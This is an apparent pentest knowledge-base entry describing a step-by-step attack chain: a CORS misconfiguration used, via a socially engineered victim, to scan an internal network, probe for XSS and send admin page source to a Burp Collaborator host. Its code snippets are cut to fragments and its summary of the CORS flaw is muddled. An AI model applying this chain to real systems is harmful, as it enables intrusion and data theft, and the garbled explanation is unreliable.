---
id: 874d0849-ba12-40ed-8582-5e2606858b12
name: 'CORS Misconfiguration Leading To Internal Network Pivot '
type: procedure
verified: true
submitted: true
created_at: '2020-08-17T07:52:51.693306+00:00'
updated_at: '2023-05-26T01:01:10.817964+00:00'
platforms:
- Web
tags:
- '[[CORS]]'
- '[[Internal Network Pivot ]]'
- '[[Web Applications]]'
---

# CORS Misconfiguration Leading To Internal Network Pivot 

**Status**: ✓ Verified

## Summary

with Access-Control-Allow-Credentials: header not set by the application server, victim's browser will send the cookies to the attacker's domain. 

## Description

# Description

`with Access-Control-Allow-Credentials: header not set by the application server, victim's browser will send the cookies to the attacker's domain. `

# Instructions

# 

1. Start the burp collaborator client .  Click on *Copy to Collaborator * to copy the url .



![fd004f3d-ce4b-4a76-8838-44d0a4477630.png](_assets/images/Mash/fd004f3d-ce4b-4a76-8838-44d0a4477630.png)







2. Sacn the local network to identify the end point using the code below. Craft an exploit with below code and deliver it to the victim through social enginnering means. Replace the url with collaborator URL.







**Code**: [[<script>
var q = [], collaboratorURL = 'http://$c]]









3.Once the victim access the exploit, observe the collaborator window in burpSuite.If you dont see the any response in the collaborator window click on* Poll Now. *Obsereve the  local network IP and port number in HTTP responses from the application server.







![550cac81-8f57-49cd-b52d-d714c05b39c1.png](_assets/images/Mash/550cac81-8f57-49cd-b52d-d714c05b39c1.png)







4.Replace the Ip in the below code with the ip obtained in step 3. The following code will probe for the xss vulnerability in username filed. If the username filed is vulenerable to xss , response can be seen in the collaborator window with *foundxss=1. Craft an exploit and deliver it to the victim.*









**Code**: [[<script>
function xss(url, text, vector) {
  loc]]







5. Observe the collaborator window which shows the xss vulnerability. 





![74f4828e-1771-4ada-b816-d47b8ed9c410.png](_assets/images/Mash/74f4828e-1771-4ada-b816-d47b8ed9c410.png)







6. Modify the code from step 4 to access the source code of the admin page . Replace the collaborator url and ip (from step2)

in the below code. 





**Code**: [[<script>
function xss(url, text, vector) {
  loc]]







7. Observe the HTTP response in the collaborator window. Source code of the admin page can be observed .  It can be observed that the source code contains the option to delete the user .







![4e3ec30e-7793-46b2-b271-daa686750e11.png](_assets/images/Mash/4e3ec30e-7793-46b2-b271-daa686750e11.png)



## Platforms

- Web

## Tags

- [[CORS]]
- [[Internal Network Pivot ]]
- [[Web Applications]]


